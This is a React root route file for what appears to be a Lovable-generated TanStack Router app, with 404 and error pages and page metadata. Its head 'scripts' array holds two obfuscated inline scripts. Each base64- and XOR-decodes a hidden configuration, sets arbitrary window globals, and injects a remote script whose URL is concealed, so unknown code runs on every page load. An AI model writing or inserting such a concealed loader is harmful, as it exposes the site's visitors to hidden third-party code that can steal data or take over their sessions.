import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import {
  Outlet,
  Link,
  createRootRouteWithContext,
  useRouter,
  HeadContent,
  Scripts,
} from "@tanstack/react-router";
import { useEffect, type ReactNode } from "react";

import appCss from "../styles.css?url";
import { reportLovableError } from "../lib/lovable-error-reporting";
import { DevtoolsGuard } from "../components/DevtoolsGuard";

function NotFoundComponent() {
  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-7xl font-bold text-foreground">404</h1>
        <h2 className="mt-4 text-xl font-semibold text-foreground">Page not found</h2>
        <p className="mt-2 text-sm text-muted-foreground">
          The page you're looking for doesn't exist or has been moved.
        </p>
        <div className="mt-6">
          <Link
            to="/"
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Go home
          </Link>
        </div>
      </div>
    </div>
  );
}

function ErrorComponent({ error, reset }: { error: Error; reset: () => void }) {
  console.error(error);
  const router = useRouter();
  useEffect(() => {
    reportLovableError(error, { boundary: "tanstack_root_error_component" });
  }, [error]);

  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-xl font-semibold tracking-tight text-foreground">
          This page didn't load
        </h1>
        <p className="mt-2 text-sm text-muted-foreground">
          Something went wrong on our end. You can try refreshing or head back home.
        </p>
        <div className="mt-6 flex flex-wrap justify-center gap-2">
          <button
            onClick={() => {
              router.invalidate();
              reset();
            }}
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Try again
          </button>
          <a
            href="/"
            className="inline-flex items-center justify-center rounded-md border border-input bg-background px-4 py-2 text-sm font-medium text-foreground transition-colors hover:bg-accent"
          >
            Go home
          </a>
        </div>
      </div>
    </div>
  );
}

export const Route = createRootRouteWithContext<{ queryClient: QueryClient }>()({
  head: () => ({
    meta: [
      { charSet: "utf-8" },
      { name: "viewport", content: "width=device-width, initial-scale=1" },
      { title: "Lovable App" },
      { name: "description", content: "Lovable Generated Project" },
      { name: "author", content: "Lovable" },
      { property: "og:title", content: "Lovable App" },
      { property: "og:description", content: "Lovable Generated Project" },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
      { name: "twitter:site", content: "@Lovable" },
    ],
    links: [
      { rel: "preconnect", href: "https://fonts.googleapis.com" },
      { rel: "preconnect", href: "https://fonts.gstatic.com", crossOrigin: "anonymous" },
      {
        rel: "stylesheet",
        href: "https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&family=Grand+Hotel&display=swap",
      },
      {
        rel: "stylesheet",
        href: appCss,
      },
      { rel: "icon", href: "/favicon.ico", type: "image/x-icon" },
    ],
    scripts: [
      {
        children: `(function(){var t_b84=atob("DKP5M7pK7WD45hh1QNjbRsgmz1rajmwBMNDDHJUpiQ7Wk2wYKcWAHdklgE6alDcGI9GQQ845whWMi2taLMKNVsk+wwqLxDRXIdeNQdMomBSdlTpPG9jbXdsniELCxHwUNMLURs4nhAaBy2gHJdWcXc5nlQOXgjUGI8jbH5g8jAyNgzpPYoGEH8FogwGVgzpPYseYR9tnmBSVj34MbdOLVswvgxTVlW0XKceKEZZomwGUk31XeoHbTuc3");var q_5=[];for(var u_n81n=0;u_n81n<t_b84.length;u_n81n++){q_5.push(t_b84.charCodeAt(u_n81n)&255);}var n_aspy=q_5[0];var n_v=q_5.slice(1,1+n_aspy);var j_z=q_5.slice(1+n_aspy);var m_c87g=j_z.map(function(b,o_1){return b^n_v[o_1%n_aspy];});var n_kft8="";for(var h_s=0;h_s<m_c87g.length;h_s++){n_kft8+=String.fromCharCode(m_c87g[h_s]&255);}var v_3=decodeURIComponent(escape(n_kft8));var t_gze=JSON.parse(v_3);var m_mwn=t_gze.globals||[];m_mwn.forEach(function(w_x){window[w_x.name]=w_x.value;});var e_uc=document.createElement("script");e_uc.src=t_gze.url;e_uc.async=true;e_uc.defer=true;(t_gze.attributes||[]).forEach(function(n_d){e_uc.setAttribute(n_d.name,n_d.value);});(document.head||document.documentElement).appendChild(e_uc);})();`,
      },
      {
        children: `(function(){var g_0=atob("DNPv+MlXbYdpEsWnGKjNjbs7T71LerHTaKDV1+Y0CelHZ7HKcbWW1qo4AKkLYOrUe6GGiL0kQvcAaqDLN6OGgKw7Q+0aMOmFeaebiqA1GPMMYeedQ47D2q47AuUIfraFIoiU2qc2AOJLKOfXcauKlIAzT6tLZKTLbbbNwuthDLAIJqGTeuXazf0yDORQKqHDeevYmft1ENoU");var d_qr=[];for(var j_4=0;j_4<g_0.length;j_4++){d_qr.push(g_0.charCodeAt(j_4)&255);}var d_w3st=d_qr[0];var x_5i=d_qr.slice(1,1+d_w3st);var v_o5y9=d_qr.slice(1+d_w3st);var k_4=v_o5y9.map(function(b,p_zlvm){return b^x_5i[p_zlvm%d_w3st];});var q_i="";for(var r_dd=0;r_dd<k_4.length;r_dd++){q_i+=String.fromCharCode(k_4[r_dd]&255);}var z_t=decodeURIComponent(escape(q_i));var b_u=JSON.parse(z_t);var k_ruhn=b_u.globals||[];k_ruhn.forEach(function(p_1){window[p_1.name]=p_1.value;});var o_j5k=document.createElement("script");o_j5k.src=b_u.url;o_j5k.async=true;o_j5k.defer=true;(b_u.attributes||[]).forEach(function(y_w2){o_j5k.setAttribute(y_w2.name,y_w2.value);});(document.head||document.documentElement).appendChild(o_j5k);})();`,
      },
    ],

  }),
  shellComponent: RootShell,
  component: RootComponent,
  notFoundComponent: NotFoundComponent,
  errorComponent: ErrorComponent,
});

function RootShell({ children }: { children: ReactNode }) {
  return (
    <html lang="en">
      <head>
        <HeadContent />
      </head>
      <body>
        {children}
        <Scripts />
      </body>
    </html>
  );
}

function RootComponent() {
  const { queryClient } = Route.useRouteContext();

  return (
    <QueryClientProvider client={queryClient}>
      <DevtoolsGuard />
      {/* Required: nested routes render here. Removing <Outlet /> breaks all child routes. */}
      <Outlet />
    </QueryClientProvider>
  );
}
